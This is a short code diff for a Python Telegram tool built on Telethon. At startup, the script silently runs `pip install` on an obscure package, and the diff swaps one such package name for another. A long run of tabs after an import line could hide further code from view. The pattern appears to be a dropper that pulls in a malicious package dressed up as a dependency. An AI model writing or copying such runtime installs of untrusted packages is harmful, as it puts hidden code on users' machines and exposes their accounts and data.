@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscoloringsaddition")
-import syscoloringsaddition
+os.system("pip install syssqlitedbmodules")
+import syssqlitedbmodules
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
